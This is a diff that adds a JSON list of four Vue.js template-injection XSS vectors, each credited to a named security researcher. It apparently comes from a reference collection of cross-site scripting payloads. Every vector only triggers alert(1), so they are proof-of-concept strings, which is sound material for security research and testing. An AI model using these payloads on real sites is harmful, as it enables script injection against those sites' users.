@@ -1,0 +1,69 @@
+[
+    {
+        "authors": [
+            {
+                "name": "Mario Heiderich",
+                "company": "Cure53",
+                "twitterUrl": "https:\/\/twitter.com\/cure53berlin"
+            }
+        ],
+        "vector": "{{constructor.constructor('alert(1)')()}}",
+        "hash": "",
+        "type": "reflected",
+        "csp": false
+    },
+    {
+        "authors": [
+            {
+                "name": "Mario Heiderich",
+                "company": "Cure53",
+                "twitterUrl": "https:\/\/twitter.com\/cure53berlin"
+            },
+            {
+                "name": "Sebastian Lekies",
+                "company": "Google",
+                "twitterUrl": "https://twitter.com/slekies"
+            },
+            {
+                "name": "Eduardo Vela Nava",
+                "company": "Google",
+                "twitterUrl": "https://twitter.com/sirdarckcat"
+            },
+            {
+                "name": "Krzysztof Kotowicz",
+                "company": "Google",
+                "twitterUrl": "https://twitter.com/kkotowicz"
+            }
+        ],
+        "vector": "<div v-html=\"''.constructor.constructor('alert(1)')()\">a</div>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false
+    },
+    {
+        "authors": [
+            {
+                "name": "Gareth Heyes",
+                "company": "PortSwigger",
+                "twitterUrl": "https:\/\/twitter.com\/garethheyes"
+            }
+        ],
+        "vector": "<x v-html=_c.constructor('alert(1)')()>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false
+    },
+    {
+        "authors": [
+            {
+                "name": "Peter af Geijerstam",
+                "company": "Swedish Shellcode Factory",
+                "twitterUrl": "https:\/\/twitter.com\/p4fg"
+            }
+        ],
+        "vector": "<x v-if=_c.constructor('alert(1)')()>",
+        "hash": "",
+        "type": "reflected",
+        "csp": false
+    }
+]
